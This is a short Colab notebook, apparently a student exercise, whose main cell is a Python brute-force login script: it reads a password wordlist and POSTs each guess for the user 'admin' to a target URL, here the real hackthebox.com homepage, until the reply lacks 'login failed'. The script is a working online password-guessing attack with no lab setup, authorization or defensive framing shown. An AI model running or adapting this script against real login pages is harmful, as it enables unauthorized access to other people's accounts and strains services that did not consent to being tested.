{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Regis-30/Ruterana-REGIS--2409000772/blob/main/possible_credentials.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install cryptography"
      ],
      "metadata": {
        "id": "tTZ5AcaJBINK",
        "outputId": "23dafc84-9c6a-417b-9ad6-c96bc0ca1bb6",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: cryptography in /usr/local/lib/python3.11/dist-packages (43.0.3)\n",
            "Requirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.11/dist-packages (from cryptography) (1.17.1)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.11/dist-packages (from cffi>=1.12->cryptography) (2.22)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "\n",
        "from google.colab import files\n",
        "uploaded = files.upload()  #select. \"password.txt\" from your local machine\n",
        "\n",
        "def brute_force_login(target_url, username, password_list=\"passwords_list (1).txt\"):\n",
        "    with open(password_list, 'r') as file:\n",
        "        for password in file.readlines():\n",
        "            password = password.strip()\n",
        "            data = {\"username\": username, \"password\": password}\n",
        "            response = requests.post(target_url, data=data)\n",
        "            if \"login failed\" not in response.text:\n",
        "                print(f\"possible credentials found: {username}:{password}\")\n",
        "                return\n",
        "    print(\"No valid credentials found.\")\n",
        "\n",
        "target_url = \"https://www.hackthebox.com\"\n",
        "brute_force_login(target_url, \"admin\")"
      ],
      "metadata": {
        "id": "k7cBbyP5BZUi"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "toc_visible": true,
      "provenance": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}